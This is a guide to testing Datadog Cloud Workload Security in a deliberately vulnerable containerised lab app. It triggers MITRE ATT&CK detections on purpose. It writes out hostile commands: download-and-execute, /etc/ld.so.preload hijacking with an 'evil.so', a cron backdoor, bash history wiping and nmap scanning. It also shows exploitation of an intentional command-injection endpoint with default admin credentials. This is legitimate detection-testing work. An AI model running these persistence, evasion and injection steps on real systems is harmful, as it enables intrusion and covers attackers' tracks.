# Cloud Workload Security (CWS) Testing Guide

## Overview

This guide explains how to test Datadog Cloud Workload Security (CWS) detection capabilities using intentional attack simulations that trigger specific MITRE ATT&CK techniques.

## ⚠️ WARNING

**These tests simulate real attack techniques and should ONLY be run in:**
- Isolated test environments
- Containerized environments (Docker)
- Non-production systems
- Environments where you have explicit authorization

**NEVER run these tests on production systems or without proper authorization.**

## MITRE ATT&CK Techniques Covered

| Atomic ID | Technique | Datadog CWS Rule | Description |
|-----------|-----------|------------------|-------------|
| T1105-27 | Linux Download File and Run | Executable bit added to new file | Detects files being downloaded and made executable |
| T1046-2 | Port Scan Nmap | Network scanning utility executed | Detects network reconnaissance tools |
| T1574.006-1 | Shared Library Injection | Suspected dynamic linker hijacking | Detects ld.so.preload manipulation |
| T1053.003-2 | Cron - Add to subfolders | Cron job modified | Detects persistence via cron jobs |
| T1070.003-1 | Clear Bash History | Shell command history modified | Detects evidence removal attempts |

## Prerequisites

### 1. Datadog Configuration

Ensure CWS is enabled in your Datadog Agent configuration (already configured in docker-compose.yml):

```yaml
DD_RUNTIME_SECURITY_CONFIG_ENABLED: true
DD_RUNTIME_SECURITY_CONFIG_REMOTE_CONFIGURATION_ENABLED: true
DD_COMPLIANCE_CONFIG_ENABLED: true
DD_COMPLIANCE_CONFIG_HOST_BENCHMARKS_ENABLED: true
```

### 2. Container Requirements

The application container must run with appropriate capabilities:

```yaml
cap_add:
  - SYS_ADMIN
  - SYS_PTRACE
  - NET_ADMIN
```

**Note:** The datadog-agent service in docker-compose.yml is already configured with these capabilities.

## Testing Methods

### Method 1: Direct Script Execution (Inside Container)

Execute the CWS detonate script directly inside the container:

```bash
# Enter the application container
docker-compose exec app bash

# Run all CWS scenarios
/app/scripts/cws-detonate.sh

# The script will guide you through each attack technique
```

### Method 2: API Endpoint (Remote Trigger)

Trigger CWS scenarios via the admin API endpoint:

```bash
# Login as admin
curl -c cookies.txt -X POST http://localhost:3000/auth/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=admin123"

# Trigger all CWS scenarios
curl -b cookies.txt -X POST http://localhost:3000/admin/security/cws-trigger \
  -H "Content-Type: application/json" \
  -d '{"scenario": "all"}'
```

### Method 3: Individual Techniques via Command Injection

Use the existing command injection vulnerability in the admin panel:

```bash
# Login as admin
curl -c cookies.txt -X POST http://localhost:3000/auth/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=admin123"

# Execute individual scenarios
curl -b cookies.txt -X POST http://localhost:3000/admin/system/execute \
  -H "Content-Type: application/json" \
  -d '{"command": "/app/scripts/cws-detonate.sh"}'
```

## Detailed Test Scenarios

### Scenario 1: T1105-27 - Download and Execute

**What it does:**
- Downloads a file (simulated malware)
- Adds executable bit (`chmod +x`)
- Executes the file

**Expected CWS Detection:**
- **Rule:** "Executable bit added to new file"
- **Severity:** High
- **Signal:** Shows file path, process, and user

**Test manually:**
```bash
# Inside container
curl -o /tmp/test.sh https://raw.githubusercontent.com/example/test.sh
chmod +x /tmp/test.sh  # ⚠️ Triggers CWS
/tmp/test.sh
```

### Scenario 2: T1046-2 - Network Scanning with Nmap

**What it does:**
- Installs nmap (if not present)
- Runs a port scan on localhost

**Expected CWS Detection:**
- **Rule:** "Network scanning utility executed"
- **Severity:** High
- **Signal:** Shows nmap command, target, and ports

**Test manually:**
```bash
# Inside container
nmap -p 1-100 localhost  # ⚠️ Triggers CWS
```

### Scenario 3: T1574.006-1 - LD_PRELOAD Hijacking

**What it does:**
- Creates a malicious shared library
- Attempts to modify `/etc/ld.so.preload`
- Simulates dynamic linker hijacking

**Expected CWS Detection:**
- **Rule:** "Suspected dynamic linker hijacking attempt"
- **Severity:** Critical
- **Signal:** Shows attempted file modification

**Test manually:**
```bash
# Inside container
echo "/tmp/evil.so" | tee /etc/ld.so.preload  # ⚠️ Triggers CWS
```

### Scenario 4: T1053.003-2 - Cron Job Persistence

**What it does:**
- Creates malicious cron scripts
- Attempts to add jobs to `/etc/cron.d/`
- Copies scripts to cron subfolders (hourly, daily, weekly)

**Expected CWS Detection:**
- **Rule:** "Cron job modified"
- **Severity:** High
- **Signal:** Shows cron directory/file modifications

**Test manually:**
```bash
# Inside container
echo '* * * * * root /tmp/evil.sh' > /etc/cron.d/backdoor  # ⚠️ Triggers CWS
cp /tmp/evil.sh /etc/cron.hourly/  # ⚠️ Triggers CWS
```

### Scenario 5: T1070.003-1 - Clear Bash History

**What it does:**
- Deletes `.bash_history` file
- Clears history with `history -c`
- Disables history with `HISTFILE` unset

**Expected CWS Detection:**
- **Rule:** "Shell command history modified"
- **Severity:** Medium
- **Signal:** Shows history file deletion/modification

**Test manually:**
```bash
# Inside container
rm -f ~/.bash_history  # ⚠️ Triggers CWS
history -c  # ⚠️ Triggers CWS
unset HISTFILE  # ⚠️ Triggers CWS
```

## Viewing Detections in Datadog

### 1. Cloud Workload Security Signals

Navigate to: **Security > Cloud Workload Security > Signals**

Or visit directly:
```
https://app.datadoghq.com/security/workload
```

**What you'll see:**
- List of all CWS security signals
- Severity levels (Critical, High, Medium, Low)
- MITRE ATT&CK technique mappings
- Detailed signal information

### 2. Security Signal Details

Click on any signal to see:
- **Attack Technique:** MITRE ATT&CK ID and name
- **Process Information:** Command, PID, user
- **File Operations:** Files created, modified, or deleted
- **Network Activity:** Connections, ports, destinations
- **Container Context:** Container ID, image, service
- **User Information:** User ID, username, privilege level
- **Timeline:** Sequence of events leading to detection

### 3. Filter Signals

Filter by specific techniques:
```
@rule.name:"Executable bit added to new file"
@rule.name:"Network scanning utility executed"
@rule.name:"Suspected dynamic linker hijacking attempt"
@rule.name:"Cron job modified"
@rule.name:"Shell command history modified"
```

### 4. APM Trace Correlation

Signals are correlated with APM traces:
- View the API call that triggered the command injection
- See user authentication and session data
- Link back to application logs

## Create Custom Detection Rules

### Rule 1: Multiple Attack Techniques from Same Container

```
@cws.technique:*
service:insecure-pizza-coffee
```

**Alert when:**
- More than 3 different MITRE techniques in 10 minutes
- Indicates multi-stage attack

### Rule 2: Privilege Escalation Attempt

```
@cws.technique:T1548.* OR @cws.technique:T1068.*
```

**Alert when:**
- Any privilege escalation attempt detected
- Critical severity

### Rule 3: Persistence Mechanism Deployment

```
@cws.technique:T1053.* OR @cws.technique:T1543.*
```

**Alert when:**
- Cron jobs or systemd services modified
- High severity

## Complete Testing Workflow

### 1. Start Fresh Environment

```bash
# Stop and clean environment
docker-compose down -v

# Start services
docker-compose up -d

# Wait for services to be healthy
docker-compose ps
```

### 2. Verify CWS Agent

```bash
# Check Datadog Agent status
docker-compose exec datadog-agent agent status

# Look for "Runtime Security Agent" section
# Should show: "Status: Running"
```

### 3. Run CWS Tests

```bash
# Execute all scenarios
docker-compose exec app /app/scripts/cws-detonate.sh

# Wait for script to complete (takes ~2-3 minutes)
```

### 4. Check Datadog (wait 1-2 minutes for signals)

```bash
# Signals should appear in Datadog CWS dashboard
# Each technique should generate a separate signal
```

### 5. Review and Analyze

Go through each signal and verify:
- ✅ Correct MITRE ATT&CK technique identified
- ✅ Process and command details captured
- ✅ Container and user context included
- ✅ Severity level appropriate
- ✅ Correlated with APM traces (if triggered via API)

## Troubleshooting

### Issue: No CWS signals appearing

**Check:**

1. **CWS is enabled:**
```bash
docker-compose exec datadog-agent agent status | grep -A 10 "Runtime Security"
```

2. **Agent has required capabilities:**
```bash
docker inspect datadog-agent | jq '.[0].HostConfig.CapAdd'
```

3. **Agent can communicate with Datadog:**
```bash
docker-compose logs datadog-agent | grep -i "runtime security"
```

### Issue: Some techniques not detected

**Check:**

1. **Script execution permissions:**
```bash
ls -la /Users/tales.casagrande/Documents/Labs/apps/insecure-pizza-coffee/scripts/cws-detonate.sh
```

2. **Tool availability (nmap, gcc):**
```bash
docker-compose exec app which nmap
docker-compose exec app which gcc
```

3. **Container has required tools:**
```bash
docker-compose exec app apt-get update && apt-get install -y nmap gcc
```

### Issue: Script fails with permission denied

**Solution:** Some operations require root privileges:

```bash
# Run as root
docker-compose exec -u root app /app/scripts/cws-detonate.sh
```

## Security Best Practices (What NOT to do in Production)

This testing demonstrates **critical security failures**:

❌ **NEVER** allow command injection vulnerabilities
❌ **NEVER** run containers as root
❌ **NEVER** give containers unnecessary capabilities
❌ **NEVER** allow arbitrary code execution
❌ **NEVER** ignore CWS security signals
❌ **NEVER** disable security monitoring

✅ **DO** implement proper input validation
✅ **DO** run containers with minimal privileges
✅ **DO** use read-only filesystems where possible
✅ **DO** monitor and alert on CWS signals
✅ **DO** implement defense in depth
✅ **DO** regularly test security controls

## API Reference

### Trigger CWS Scenarios

**Endpoint:** `POST /admin/security/cws-trigger`

**Authentication:** Admin session required

**Request:**
```json
{
  "scenario": "all"
}
```

**Response (Success):**
```json
{
  "success": true,
  "scenario": "all",
  "output": "... script output ...",
  "message": "CWS scenario triggered successfully. Check Datadog CWS for detections."
}
```

**Response (Failure):**
```json
{
  "success": false,
  "error": "Command execution failed",
  "stderr": "... error details ...",
  "message": "CWS scenario execution failed"
}
```

**Example curl:**
```bash
curl -b cookies.txt -X POST http://localhost:3000/admin/security/cws-trigger \
  -H "Content-Type: application/json" \
  -d '{"scenario": "all"}'
```

## Additional Resources

- [Datadog CWS Documentation](https://docs.datadoghq.com/security/cloud_workload_security/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Datadog Security Playground](https://github.com/100HnoMeuNome/datadog-security-playground)
- [CWS Agent Configuration](https://docs.datadoghq.com/security/cloud_workload_security/agent_configuration/)

## Summary

This CWS testing suite provides:

✅ **5 Core MITRE ATT&CK Techniques**
- T1105: Ingress Tool Transfer
- T1046: Network Service Discovery
- T1574.006: Dynamic Linker Hijacking
- T1053.003: Scheduled Task/Job (Cron)
- T1070.003: Indicator Removal (History)

✅ **Multiple Testing Methods**
- Direct script execution
- API endpoint trigger
- Command injection exploitation

✅ **Complete Detection Coverage**
- All techniques trigger Datadog CWS rules
- Signals include full context and forensics
- Correlated with APM and logs

✅ **Production Security Lessons**
- Real-world attack patterns
- Defense-in-depth strategies
- Monitoring and alerting best practices

**Happy (secure) testing! 🛡️**
